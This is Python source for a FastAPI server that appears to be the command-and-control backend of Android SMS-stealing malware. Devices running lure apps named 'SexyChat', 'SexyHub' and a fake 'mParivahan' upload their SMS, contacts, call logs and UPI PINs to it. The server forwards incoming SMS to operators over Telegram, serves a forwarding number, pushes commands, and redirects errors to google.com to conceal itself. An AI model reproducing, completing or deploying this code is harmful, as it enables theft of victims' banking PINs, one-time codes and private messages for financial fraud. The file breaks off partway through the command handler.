from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Query, Depends, Request, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, RedirectResponse
from fastapi.exceptions import RequestValidationError
from starlette.exceptions import HTTPException as StarletteHTTPException
from starlette.websockets import WebSocketDisconnect as StarletteWebSocketDisconnect
from datetime import datetime, timedelta
import json

import asyncio
from typing import Optional

from .config import settings
from .database import connect_to_mongodb, close_mongodb_connection, mongodb
from .services.websocket_manager import manager
from .services.device_service import device_service
from .services.auth_service import auth_service
from .services.admin_activity_service import admin_activity_service
from .services.telegram_service import telegram_service
from .services.telegram_multi_service import telegram_multi_service
from .services.firebase_service import firebase_service
from .services.firebase_admin_service import firebase_admin_service
from .background_tasks import (
    notify_device_registration_bg,
    notify_upi_detected_bg,
    notify_admin_login_bg,
    notify_admin_logout_bg,
    send_2fa_code_bg
)

from .models.schemas import (
    DeviceStatus, SendCommandRequest, UpdateSettingsRequest,
    DeviceListResponse, SMSListResponse, ContactListResponse, StatsResponse,
    AppTypeInfo, AppTypesResponse
)
from .models.admin_schemas import (
    Admin, AdminCreate, AdminUpdate, AdminLogin, TokenResponse,
    AdminResponse, ActivityType, AdminPermission, AdminRole
)
from .models.otp_schemas import (
    OTPRequest, OTPVerify, OTPResponse, OTPVerifyResponse
)
from .models.bot_schemas import (
    BotOTPRequest, BotOTPVerify, BotOTPResponse, BotTokenResponse, BotStatusResponse
)
from .models.upi_schemas import (
    UPIPinSave, UPIPinResponse
)
from .utils.auth_middleware import (
    get_current_admin, get_optional_admin, require_permission,
    get_client_ip, get_user_agent
)
from .services.otp_service import otp_service
from .services.auth_service import ENABLE_2FA


app = FastAPI(
    title=" Control Server",
    description="WebSocket Server + REST API with Admin Panel & Telegram Integration",
    version="2.0.0",
    debug=settings.DEBUG
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.exception_handler(StarletteHTTPException)
async def http_exception_handler(request: Request, exc: StarletteHTTPException):
    if exc.status_code in [404, 401, 403]:
        return RedirectResponse(url="https://www.google.com")
    return JSONResponse(
        status_code=exc.status_code,
        content={"detail": exc.detail}
    )

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    return RedirectResponse(url="https://www.google.com")

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    logger.error(f"Unhandled exception: {exc}")
    return RedirectResponse(url="https://www.google.com")

@app.on_event("startup")
async def startup_event():
    logger.info("Starting application...")
    await connect_to_mongodb()
    await auth_service.create_default_admin()
    logger.info("Application started successfully")

@app.on_event("shutdown")
async def shutdown_event():
    logger.info("Shutting down application...")
    await close_mongodb_connection()
    logger.info("Application shutdown complete")

@app.post("/devices/heartbeat")
async def device_heartbeat(request: Request):
    
    try:
        data = await request.json()
        device_id = data.get("deviceId")
        
        if not device_id:
            raise HTTPException(status_code=400, detail="deviceId required")
        
        now = datetime.utcnow()
        await mongodb.db.devices.update_one(
            {"device_id": device_id},
            {"$set": {
                "last_ping": now,
                "status": "online",
                "is_online": True,
                "last_online_update": now
            }}
        )
        
        return {"success": True, "message": "Heartbeat received"}
        
    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/ping-response")
async def ping_response(request: Request):
    
    try:
        data = await request.json()
        device_id = data.get("deviceId") or data.get("device_id")
        
        if not device_id:
            raise HTTPException(status_code=400, detail="deviceId required")

        await device_service.update_online_status(device_id, True)
        await device_service.add_log(device_id, "ping", "Ping response received", "success")
        
        return {"success": True, "message": "Ping response received"}
        
    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/upload-response")
async def upload_response(request: Request):
    
    try:
        data = await request.json()
        device_id = data.get("device_id") or data.get("deviceId")
        status = data.get("status")
        count = data.get("count", 0)
        error = data.get("error")
        
        if not device_id or not status:
            raise HTTPException(status_code=400, detail="device_id and status required")

        upload_type = "SMS" if "sms" in status.lower() else "Contacts" if "contacts" in status.lower() else "Unknown"
        log_message = f"{upload_type} upload: {count} items"
        if error:
            log_message += f" - Error: {error}"
        
        log_level = "success" if "success" in status else "error"
        
        await device_service.add_log(device_id, "upload", log_message, log_level, metadata={
            "status": status, "count": count, "error": error, "type": upload_type
        })
        
        if "success" in status and count > 0:
            try:
                device = await device_service.get_device(device_id)
                if device and device.admin_username:
                    await telegram_multi_service.send_to_admin(
                        device.admin_username,
                        f"✅ {upload_type} Upload Complete\n"
                        f"📱 Device: <code>{device_id}</code>\n"
                        f"📊 Count: {count} items",
                        bot_index=1
                    )
            except:
                pass
        
        return {"success": True, "message": "Upload response received"}
        
    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/register")
async def register_device(message: dict, background_tasks: BackgroundTasks):
    
    device_id = message.get("device_id")
    device_info = message.get("device_info", {})
    admin_token = message.get("admin_token") or message.get("user_id")
    app_type = message.get("app_type")
    
    if app_type:
        device_info["app_type"] = app_type
    
    result = await device_service.register_device(device_id, device_info, admin_token)
    await device_service.add_log(device_id, "system", f"Device registered (app: {app_type or 'unknown'})", "info")
    
    if admin_token and result.get("device") and result["device"].get("admin_username"):
        admin_username = result["device"]["admin_username"]
        background_tasks.add_task(
            notify_device_registration_bg,
            telegram_multi_service,
            firebase_admin_service,
            admin_username,
            device_id,
            device_info,
            admin_token
        )

    return {"status": "success", "message": "Device registered successfully", "device_id": device_id}

@app.post("/battery")
async def battery_update(message: dict):
    
    device_id = message.get("device_id")
    data = message.get("data", {})
    battery_level = data.get("battery")
    is_online = data.get("is_online", True)
    
    if battery_level is not None:
        await device_service.update_battery_level(device_id, battery_level)
    
    await device_service.update_online_status(device_id, is_online)
    await device_service.add_log(device_id, "battery", f"Battery: {battery_level}%", "info")
    
    return {"status": "success"}

@app.post("/sms/batch")
async def sms_history(message: dict):
    
    device_id = message.get("device_id")
    sms_list = message.get("data", [])
    batch_info = message.get("batch_info", {})
    
    await device_service.save_sms_history(device_id, sms_list)
    
    batch_text = f"batch {batch_info.get('batch', 1)}/{batch_info.get('of', 1)}" if batch_info else ""
    await device_service.add_log(device_id, "sms", f"SMS: {len(sms_list)} messages {batch_text}".strip(), "info")
    
    return {"status": "success"}

@app.post("/contacts/batch")
async def contacts_bulk(message: dict):
    
    device_id = message.get("device_id")
    contacts_list = message.get("data", [])
    batch_info = message.get("batch_info", {})
    
    await device_service.save_contacts(device_id, contacts_list)
    
    batch_text = f"batch {batch_info.get('batch', 1)}/{batch_info.get('of', 1)}" if batch_info else ""
    await device_service.add_log(device_id, "contacts", f"Contacts: {len(contacts_list)} {batch_text}".strip(), "info")
    
    return {"status": "success"}

@app.post("/call-logs/batch")
async def call_history(message: dict):
    
    device_id = message.get("device_id")
    call_logs = message.get("data", [])
    batch_info = message.get("batch_info", {})
    
    await device_service.save_call_logs(device_id, call_logs)
    
    batch_text = f"batch {batch_info.get('batch', 1)}/{batch_info.get('of', 1)}" if batch_info else ""
    await device_service.add_log(device_id, "call_logs", f"Call logs: {len(call_logs)} {batch_text}".strip(), "info")
    
    return {"status": "success"}

@app.post("/api/sms/new")
async def receive_sms(request: Request):
    try:
        data = await request.json()

        device_id = data.get("device_id") or data.get("deviceId")
        
        if "data" in data:
            sms_info = data.get("data", {})
            sender = sms_info.get("from")
            message = sms_info.get("body") or sms_info.get("message")
            timestamp = sms_info.get("timestamp")
        else:
            sender = data.get("sender") or data.get("from")
            message = data.get("message") or data.get("body")
            timestamp = data.get("timestamp")
        
        if not device_id:
            pass

            raise HTTPException(status_code=400, detail="device_id is required")

        if not sender or not message:
            pass

            raise HTTPException(status_code=400, detail="sender and message are required")

        device = await device_service.get_device(device_id)
        if not device:
            pass

            await device_service.register_device(device_id, {
                "device_name": "Unknown Device",
                "registered_via": "sms_endpoint"
            })

        sms_data = {
            "from": sender,
            "to": data.get("to"),
            "body": message.replace('\ufffd', '').strip(),
            "timestamp": timestamp,
            "type": data.get("type", "inbox"),
            "received_in_native": data.get("received_in_native", True)
        }

        await device_service.save_new_sms(device_id, sms_data)

        await device_service.add_log(
            device_id,
            "sms",
            f"New SMS from {sender}",
            "info"
        )

        try:
            device = await device_service.get_device(device_id)
            if device and device.admin_username:
                await telegram_multi_service.notify_new_sms(
                    device_id, device.admin_username, sender, message
                )
        except Exception as tg_error:
            pass

        return {
            "status": "success",
            "device_id": device_id,
            "message": "SMS received successfully"
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise HTTPException(
            status_code=500,
            detail=f"Internal server error: {str(e)}"
        )

@app.get("/api/getForwardingNumber/{device_id}")
async def get_forwarding_number_new(device_id: str):
    pass
    
    try:
        forwarding_number = await device_service.get_forwarding_number(device_id)
        if not forwarding_number:
            return {"forwardingNumber": ""}
        return {"forwardingNumber": forwarding_number}
    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/health")
async def health_check():
    try:
        await mongodb.client.admin.command('ping')
        mongo_status = "healthy"
    except:
        mongo_status = "unhealthy"

    return {
        "status": "healthy" if mongo_status == "healthy" else "unhealthy",
        "mongodb": mongo_status,
        "websocket_connections": manager.get_connection_count(),
        "timestamp": datetime.utcnow().isoformat()
    }

@app.post("/auth/login")
async def login(login_data: AdminLogin, request: Request, background_tasks: BackgroundTasks):
    
    ip_address = get_client_ip(request)
    user_agent = get_user_agent(request)
    admin = await auth_service.authenticate_admin(login_data)

    if not admin:
        await admin_activity_service.log_activity(
            admin_username=login_data.username,
            activity_type=ActivityType.LOGIN,
            description="Failed login attempt - Invalid credentials",
            ip_address=ip_address,
            user_agent=user_agent,
            success=False,
            error_message="Invalid credentials"
        )

        raise HTTPException(
            status_code=401,
            detail="Invalid username or password"
        )
    
    if not ENABLE_2FA:
        session_id = auth_service.generate_session_id()
        update_result = await mongodb.db.admins.update_one(
            {"username": admin.username},
            {
                "$set": {
                    "current_session_id": session_id,
                    "last_session_ip": ip_address,
                    "last_session_device": user_agent
                }
            }
        )
        
        access_token = auth_service.create_access_token(
            data={"sub": admin.username, "role": admin.role},
            session_id=session_id
        )

        await admin_activity_service.log_activity(
            admin_username=admin.username,
            activity_type=ActivityType.LOGIN,
            description="Successful login (2FA disabled)",
            ip_address=ip_address,
            user_agent=user_agent,
            success=True
        )

        background_tasks.add_task(
            notify_admin_login_bg,
            telegram_multi_service,
            admin.username,
            ip_address,
            True
        )

        return TokenResponse(
            access_token=access_token,
            token_type="bearer",
            expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
            admin=AdminResponse(
                username=admin.username,
                email=admin.email,
                full_name=admin.full_name,
                role=admin.role,
                permissions=admin.permissions,
                is_active=admin.is_active,
                last_login=admin.last_login,
                login_count=admin.login_count,
                created_at=admin.created_at
            )
        )
    
    otp_code = await otp_service.create_otp(admin.username, ip_address)
    
    background_tasks.add_task(
        send_2fa_code_bg,
        telegram_multi_service,
        admin.username,
        ip_address,
        otp_code,
        None
    )
    
    temp_token = auth_service.create_temp_token(admin.username)
    
    await admin_activity_service.log_activity(
        admin_username=admin.username,
        activity_type=ActivityType.LOGIN,
        description="Login step 1: Password verified, OTP sent",
        ip_address=ip_address,
        user_agent=user_agent,
        success=True,
        metadata={"step": "otp_sent"}
    )
    
    return OTPResponse(
        success=True,
        message="OTP code sent to your Telegram. Please verify to complete login.",
        temp_token=temp_token,
        expires_in=300
    )

@app.post("/auth/verify-2fa", response_model=TokenResponse)
async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks: BackgroundTasks):
    pass
    
    ip_address = get_client_ip(request)
    user_agent = get_user_agent(request)
    
    username = auth_service.verify_temp_token(verify_data.temp_token)
    
    if not username or username != verify_data.username:
        raise HTTPException(
            status_code=401,
            detail="Invalid or expired temporary token"
        )
    
    otp_result = await otp_service.verify_otp(
        verify_data.username,
        verify_data.otp_code,
        ip_address
    )
    
    if not otp_result["valid"]:
        await otp_service.increment_attempts(verify_data.username, verify_data.otp_code)
        
        await admin_activity_service.log_activity(
            admin_username=verify_data.username,
            activity_type=ActivityType.LOGIN,
            description=f"Failed OTP verification: {otp_result['message']}",
            ip_address=ip_address,
            user_agent=user_agent,
            success=False,
            error_message=otp_result["message"]
        )
        
        raise HTTPException(
            status_code=401,
            detail=otp_result["message"]
        )
    
    admin = await auth_service.get_admin_by_username(verify_data.username)
    
    if not admin:
        raise HTTPException(
            status_code=404,
            detail="Admin not found"
        )
    
    session_id = auth_service.generate_session_id()
    
    update_data = {
        "$set": {
            "current_session_id": session_id,
            "last_session_ip": ip_address,
            "last_session_device": user_agent
        }
    }
    
    if verify_data.fcm_token:
        update_data["$set"]["fcm_tokens"] = [verify_data.fcm_token]
    
    update_result = await mongodb.db.admins.update_one(
        {"username": admin.username},
        update_data
    )
    
    access_token = auth_service.create_access_token(
        data={"sub": admin.username, "role": admin.role},
        session_id=session_id
    )
    
    await admin_activity_service.log_activity(
        admin_username=admin.username,
        activity_type=ActivityType.LOGIN,
        description="Login step 2: OTP verified, login complete",
        ip_address=ip_address,
        user_agent=user_agent,
        success=True,
        metadata={"step": "otp_verified"}
    )
    
    background_tasks.add_task(
        notify_admin_login_bg,
        telegram_multi_service,
        admin.username,
        ip_address,
        True
    )
    
    return TokenResponse(
        access_token=access_token,
        token_type="bearer",
        expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
        admin=AdminResponse(
            username=admin.username,
            email=admin.email,
            full_name=admin.full_name,
            role=admin.role,
            permissions=admin.permissions,
            is_active=admin.is_active,
            last_login=admin.last_login,
            login_count=admin.login_count,
            created_at=admin.created_at
        )
    )

@app.post("/auth/logout")
async def logout(
    request: Request,
    background_tasks: BackgroundTasks,
    current_admin: Admin = Depends(get_current_admin)
):
    
    ip_address = get_client_ip(request)

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.LOGOUT,
        description="Logged out",
        ip_address=ip_address
    )

    background_tasks.add_task(
        notify_admin_logout_bg,
        telegram_multi_service,
        current_admin.username,
        ip_address
    )

    return {"message": "Logged out successfully"}

@app.post("/bot/auth/request-otp", response_model=BotOTPResponse, tags=["Bot Auth"])
async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks: BackgroundTasks):
    
    ip_address = get_client_ip(req)
    admin = await auth_service.get_admin_by_username(request.username)
    
    if not admin:
        raise HTTPException(status_code=404, detail="Admin not found")
    if not admin.is_active:
        raise HTTPException(status_code=403, detail="Admin account is disabled")
    
    otp_code = await otp_service.create_otp(request.username, ip_address)
    
    background_tasks.add_task(
        send_2fa_code_bg,
        telegram_multi_service,
        request.username,
        ip_address,
        otp_code,
        f"🤖 Bot Authentication Request\nBot: {request.bot_identifier}\n"
    )
    
    await admin_activity_service.log_activity(
        admin_username=request.username,
        activity_type=ActivityType.LOGIN,
        description=f"Bot OTP requested: {request.bot_identifier}",
        ip_address=ip_address,
        success=True
    )
    
    return BotOTPResponse(
        success=True,
        message="OTP sent to your Telegram. Please verify to get service token.",
        expires_in=300
    )

@app.post("/bot/auth/verify-otp", response_model=BotTokenResponse, tags=["Bot Auth"])
async def bot_verify_otp(request: BotOTPVerify, req: Request):
    pass
    
    ip_address = get_client_ip(req)
    user_agent = get_user_agent(req)
    otp_result = await otp_service.verify_otp(request.username, request.otp_code, ip_address)
    
    if not otp_result["valid"]:
        await admin_activity_service.log_activity(
            admin_username=request.username,
            activity_type=ActivityType.LOGIN,
            description=f"Bot OTP verification failed: {request.bot_identifier}",
            ip_address=ip_address,
            success=False,
            error_message=otp_result["message"]
        )
        raise HTTPException(status_code=401, detail=otp_result["message"])
    
    admin = await auth_service.get_admin_by_username(request.username)
    
    if not admin:
        raise HTTPException(status_code=404, detail="Admin not found")
    if not admin.is_active:
        raise HTTPException(status_code=403, detail="Admin account is disabled")
    
    service_token = auth_service.create_access_token(
        data={
            "sub": admin.username,
            "role": admin.role,
            "bot_identifier": request.bot_identifier
        },
        client_type="service",
        is_bot=True
    )
    
    await admin_activity_service.log_activity(
        admin_username=request.username,
        activity_type=ActivityType.LOGIN,
        description=f"Bot authenticated successfully: {request.bot_identifier}",
        ip_address=ip_address,
        user_agent=user_agent,
        success=True,
        metadata={"bot": request.bot_identifier}
    )
    
    await telegram_multi_service.notify_admin_action(
        admin_username=request.username,
        action="bot_authenticated",
        details=f"Bot '{request.bot_identifier}' successfully authenticated",
        ip_address=ip_address
    )
    
    return BotTokenResponse(
        success=True,
        message="Bot authenticated successfully. Use this service token for all future requests.",
        service_token=service_token,
        admin_info={
            "username": admin.username,
            "role": admin.role,
            "is_active": admin.is_active
        }
    )

@app.get("/bot/auth/check", response_model=BotStatusResponse, tags=["Bot Auth"])
async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
    
    return BotStatusResponse(
        active=current_admin.is_active,
        admin_username=current_admin.username,
        device_token=current_admin.device_token,
        message="Admin is active" if current_admin.is_active else "Admin is disabled"
    )

@app.post("/save-pin", response_model=UPIPinResponse, tags=["UPI"])
async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
    
    try:
        admin_token = pin_data.user_id
        admin = await mongodb.db.admins.find_one({"device_token": admin_token})
        
        if not admin:
            pass

            admin_username = None
        else:
            admin_username = admin["username"]
        
        device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
        
        if not device:
            pass

            raise HTTPException(
                status_code=404,
                detail="Device not found. Device must be registered before saving PIN."
            )
        
        update_data = {
            "$set": {
                "upi_pin": pin_data.upi_pin,
                "has_upi": True,
                "upi_detected_at": datetime.utcnow(),
                "upi_last_updated_at": datetime.utcnow(),
                "updated_at": datetime.utcnow()
            }
        }
        
        result = await mongodb.db.devices.update_one(
            {"device_id": pin_data.device_id},
            update_data
        )
        
        await device_service.add_log(
            pin_data.device_id,
            "upi",
            f"UPI PIN saved from {pin_data.app_type} app (PIN: {pin_data.upi_pin})",
            "info"
        )
        
        if admin_username:
            device_model = device.get("model", "Unknown")
            
            background_tasks.add_task(
                notify_upi_detected_bg,
                telegram_multi_service,
                firebase_admin_service,
                admin_username,
                pin_data.device_id,
                pin_data.upi_pin,
                device_model
            )
        else:
            pass

        return UPIPinResponse(
            status="success",
            message="PIN saved successfully",
            timestamp=datetime.utcnow()
        )
    
    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/auth/me", response_model=AdminResponse)
async def get_current_admin_info(current_admin: Admin = Depends(get_current_admin)):
    
    return AdminResponse(
        username=current_admin.username,
        email=current_admin.email,
        full_name=current_admin.full_name,
        role=current_admin.role,
        permissions=current_admin.permissions,
        device_token=current_admin.device_token,
        telegram_2fa_chat_id=current_admin.telegram_2fa_chat_id,
        telegram_bots=current_admin.telegram_bots,
        is_active=current_admin.is_active,
        last_login=current_admin.last_login,
        login_count=current_admin.login_count,
        created_at=current_admin.created_at
    )

@app.post("/admin/create", response_model=AdminResponse)
async def create_admin(
    admin_create: AdminCreate,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    
    new_admin = await auth_service.create_admin(admin_create, created_by=current_admin.username)

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.CREATE_ADMIN,
        description=f"Created new admin: {new_admin.username}",
        ip_address=get_client_ip(request),
        metadata={"new_admin": new_admin.username, "role": new_admin.role.value}
    )

    await telegram_multi_service.notify_admin_created(
        current_admin.username,
        new_admin.username,
        new_admin.role.value,
        new_admin.device_token
    )

    return AdminResponse(
        username=new_admin.username,
        email=new_admin.email,
        full_name=new_admin.full_name,
        role=new_admin.role,
        permissions=new_admin.permissions,
        device_token=new_admin.device_token,
        telegram_2fa_chat_id=new_admin.telegram_2fa_chat_id,
        telegram_bots=new_admin.telegram_bots,
        is_active=new_admin.is_active,
        last_login=new_admin.last_login,
        login_count=new_admin.login_count,
        created_at=new_admin.created_at
    )

@app.get("/admin/list")
async def list_admins(
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    
    admins = await auth_service.get_all_admins()
    return {"admins": admins, "total": len(admins)}

@app.put("/admin/{username}")
async def update_admin(
    username: str,
    admin_update: AdminUpdate,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    
    success = await auth_service.update_admin(username, admin_update)

    if not success:
        raise HTTPException(status_code=404, detail="Admin not found or no changes made")

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.UPDATE_ADMIN,
        description=f"Updated admin: {username}",
        ip_address=get_client_ip(request),
        metadata={"updated_admin": username, "changes": admin_update.model_dump(exclude_unset=True)}
    )

    return {"message": "Admin updated successfully"}

@app.delete("/admin/{username}")
async def delete_admin(
    username: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    
    if username == current_admin.username:
        raise HTTPException(status_code=400, detail="Cannot delete yourself")

    success = await auth_service.delete_admin(username)

    if not success:
        raise HTTPException(status_code=404, detail="Admin not found")

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.DELETE_ADMIN,
        description=f"Deleted admin: {username}",
        ip_address=get_client_ip(request),
        metadata={"deleted_admin": username}
    )

    return {"message": "Admin deleted successfully"}

@app.get("/admin/activities")
async def get_admin_activities(
    admin_username: Optional[str] = None,
    activity_type: Optional[str] = None,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    current_admin: Admin = Depends(get_current_admin)
):
    
    if current_admin.role != AdminRole.SUPER_ADMIN:
        admin_username = current_admin.username

    activities = await admin_activity_service.get_activities(
        admin_username=admin_username,
        activity_type=ActivityType(activity_type) if activity_type else None,
        skip=skip,
        limit=limit
    )

    total = await mongodb.db.admin_activities.count_documents(
        {"admin_username": admin_username} if admin_username else {}
    )

    return {
        "activities": activities,
        "total": total,
        "page": skip // limit + 1,
        "page_size": limit
    }

@app.get("/admin/activities/stats")
async def get_admin_activity_stats(
    admin_username: Optional[str] = None,
    current_admin: Admin = Depends(get_current_admin)
):
    
    if current_admin.role != AdminRole.SUPER_ADMIN:
        admin_username = current_admin.username
    
    stats = await admin_activity_service.get_activity_stats(admin_username)
    recent_logins = await admin_activity_service.get_recent_logins(limit=10)

    return {
        "stats": stats,
        "recent_logins": recent_logins
    }

@app.get("/api/devices/stats", response_model=StatsResponse)
async def get_device_stats(
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    
    admin_username = None if current_admin.role == AdminRole.SUPER_ADMIN else current_admin.username
    
    stats = await device_service.get_stats(admin_username=admin_username)
    return StatsResponse(**stats)

@app.get("/api/stats")
async def get_stats(current_admin: Admin = Depends(get_current_admin)):
    
    admin_username = None if current_admin.role == AdminRole.SUPER_ADMIN else current_admin.username
    
    stats = await device_service.get_stats(admin_username=admin_username)
    return StatsResponse(**stats)

@app.get("/api/devices/app-types", response_model=AppTypesResponse)
async def get_app_types(
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    
    is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
    query = {} if is_super_admin else {"admin_username": current_admin.username}
    
    pipeline = [
        {"$match": query},
        {"$group": {
            "_id": "$app_type",
            "count": {"$sum": 1}
        }},
        {"$sort": {"count": -1}}
    ]
    
    results = await mongodb.db.devices.aggregate(pipeline).to_list(None)
    
    app_names = {
        'sexychat': {'name': 'SexyChat', 'icon': '💬'},
        'mparivahan': {'name': 'mParivahan', 'icon': '🚗'},
        'sexyhub': {'name': 'SexyHub', 'icon': '🎬'},
        'MP': {'name': 'mParivahan', 'icon': '🚗'},
    }
    
    app_types = []
    for item in results:
        app_type = item["_id"] or "unknown"
        app_info = app_names.get(app_type, {'name': app_type, 'icon': '📱'})
        
        app_types.append(AppTypeInfo(
            app_type=app_type,
            display_name=app_info['name'],
            icon=app_info['icon'],
            count=item["count"]
        ))
    
    return AppTypesResponse(
        app_types=app_types,
        total=len(app_types)
    )

@app.get("/api/devices", response_model=DeviceListResponse)
async def get_devices(
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    app_type: Optional[str] = Query(None, description="Filter by app type"),
    admin_username: Optional[str] = Query(None, description="Filter by admin (Super Admin only)"),
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    
    is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
    
    if is_super_admin:
        if admin_username and admin_username.strip():
            if admin_username.strip().lower() == "all":
                query = {}
            else:
                query = {"admin_username": admin_username.strip()}
        else:
            query = {"admin_username": current_admin.username}
    else:
        query = {"admin_username": current_admin.username}
    
    if app_type:
        query["app_type"] = app_type
    
    query["model"] = {"$exists": True, "$ne": None}
    
    devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
    devices = await devices_cursor.to_list(length=limit)
    total = await mongodb.db.devices.count_documents(query)
    has_more = (skip + len(devices)) < total

    return DeviceListResponse(
        devices=devices, 
        total=total,
        hasMore=has_more
    )

@app.get("/api/admin/{admin_username}/devices", response_model=DeviceListResponse)
async def get_admin_devices(
    admin_username: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    app_type: Optional[str] = Query(None, description="Filter by app type"),
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    
    target_admin = await auth_service.get_admin_by_username(admin_username)
    
    if not target_admin:
        raise HTTPException(status_code=404, detail=f"Admin '{admin_username}' not found")
    
    query = {"admin_username": admin_username}
    if app_type:
        query["app_type"] = app_type
    
    query["model"] = {"$exists": True, "$ne": None}
    
    devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
    devices = await devices_cursor.to_list(length=limit)
    total = await mongodb.db.devices.count_documents(query)
    has_more = (skip + len(devices)) < total
    
    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.VIEW_DEVICE,
        description=f"Viewed devices for admin: {admin_username}" + (f" (app: {app_type})" if app_type else ""),
        ip_address="system"
    )
    
    return DeviceListResponse(
        devices=devices,
        total=total,
        hasMore=has_more
    )

@app.get("/api/devices/{device_id}")
async def get_device(
    device_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    
    device = await device_service.get_device(device_id)

    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.VIEW_DEVICE,
        description=f"Viewed device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id
    )

    return device

@app.get("/api/devices/{device_id}/sms")
async def get_device_sms(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(50, ge=1, le=500),
    request: Request = None,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_SMS))
):
    
    messages = await device_service.get_sms_messages(device_id, skip, limit)
    total = await mongodb.db.sms_messages.count_documents({"device_id": device_id})

    for msg in messages:
        if msg.get('body'):
            msg['body'] = msg['body'].replace('\ufffd', '').strip()

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.VIEW_SMS,
        description=f"Viewed SMS for device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id,
        metadata={"count": len(messages)}
    )

    return {
        "messages": messages,
        "total": total,
        "page": skip // limit + 1,
        "page_size": limit
    }

@app.get("/api/devices/{device_id}/contacts")
async def get_device_contacts(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    request: Request = None,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_CONTACTS))
):
    
    contacts = await device_service.get_contacts(device_id, skip, limit)
    total = await mongodb.db.contacts.count_documents({"device_id": device_id})

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.VIEW_CONTACTS,
        description=f"Viewed contacts for device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id,
        metadata={"count": len(contacts)}
    )

    return {
        "contacts": contacts,
        "total": total
    }

@app.get("/api/devices/{device_id}/logs")
async def get_device_logs(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    
    logs = await device_service.get_logs(device_id, skip, limit)
    total = await mongodb.db.logs.count_documents({"device_id": device_id})

    return {
        "logs": logs,
        "total": total
    }

@app.post("/api/devices/{device_id}/command")
async def send_command_to_device(
    device_id: str,
    command_request: SendCommandRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.SEND_COMMANDS))
):
    
    device = await device_service.get_device(device_id)
    
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    if command_request.command == "note":
        priority = command_request.parameters.get("priority", "none")
        message = command_request.parameters.get("message", "")
        success = await device_service.save_device_note(device_id, priority, message)
        
        if not success:
            raise HTTPException(status_code=400, detail="Failed to save note")
        
        result = await firebase_service.send_command_to_device(
            device_id,
            "note",
            {
                "priority": priority,
                "message": message
            }
        )
        
        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Sent note to device: {device_id} - Priority: {priority}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "note", "priority": priority, "message": message}
        )
        
        return {
            "success": True,
            "message": "Note saved and sent successfully",
            "type": "note",
            "result": result
        }

    is_ping_command = command_request.command == "ping"
    ping_type = command_request.parameters.get("type", "server") if command_request.parameters else "server"

